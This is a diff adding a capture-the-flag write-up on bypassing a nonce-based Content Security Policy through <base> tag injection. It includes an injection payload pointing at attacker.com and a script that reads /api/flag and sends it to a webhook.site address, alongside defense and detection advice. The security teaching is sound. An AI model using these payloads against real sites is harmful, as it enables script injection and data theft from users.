@@ -35,6 +35,7 @@
 - [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
 - [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
 - [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
+- [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
 
 ---
 
@@ -619,3 +620,53 @@ def serveIt(request):
 Deploy with `gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated`.
 
 **Key insight:** Cloud platform domains are shared infrastructure. Whitelisting `*.run.app` or `*.cloudfunctions.net` in CSP allows any attacker-deployed function to serve scripts. Prefer `nonce-based` or `hash-based` CSP over domain whitelists for cloud-hosted applications.
+
+---
+
+## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)
+
+**Pattern (web-tutorial-2):** CSP uses `script-src 'nonce-xxx'` to restrict script execution to nonced scripts. However, the CSP is missing the `base-uri` directive. If you can inject HTML before a nonced script that loads from a relative URL, inject a `<base>` tag to redirect the relative URL to your server.
+
+**Vulnerable CSP:**
+```text
+Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
+```
+Notice: no `base-uri` directive.
+
+**Vulnerable page HTML:**
+```html
+<!-- Attacker injects here via stored XSS, parameter injection, etc. -->
+<base href="https://attacker.com/">
+<!-- ... later in the page ... -->
+<script nonce="abc123" src="test.js"></script>
+```
+
+**How it works:**
+1. The `<base href="https://attacker.com/">` tag changes the base URL for all relative URLs on the page
+2. When the browser encounters `<script nonce="abc123" src="test.js">`, it resolves `test.js` relative to the new base → `https://attacker.com/test.js`
+3. The script has a valid nonce, so CSP allows it
+4. The script loads from the attacker's server, executing arbitrary JavaScript
+
+**Exploit setup:**
+```python
+# Host malicious test.js on attacker server
+# test.js content:
+"""
+fetch('/api/flag')
+  .then(r => r.text())
+  .then(f => fetch('https://webhook.site/YOUR_ID?flag=' + encodeURIComponent(f)));
+"""
+```
+
+**Injection payload:**
+```html
+<base href="https://attacker.com/">
+```
+
+**Key insight:** The `<base>` tag affects ALL relative URLs on the page, including nonced scripts. CSP `script-src 'nonce-xxx'` only validates that the nonce matches — it does NOT restrict where the script is loaded from (that would require `script-src` with domain restrictions). Without `base-uri 'self'` or `base-uri 'none'` in the CSP, any HTML injection point before a relative-URL nonced script enables full CSP bypass.
+
+**Defense:** Always include `base-uri 'self'` or `base-uri 'none'` in CSP policies that use nonces. This prevents `<base>` tag injection from redirecting script sources.
+
+**Detection:** Check CSP for `script-src 'nonce-...'` combined with missing `base-uri` directive. Look for nonced `<script src="relative.js">` tags (relative URL, not absolute) that appear after a potential injection point.
+
+**References:** BSidesSF 2026 "web-tutorial-2"
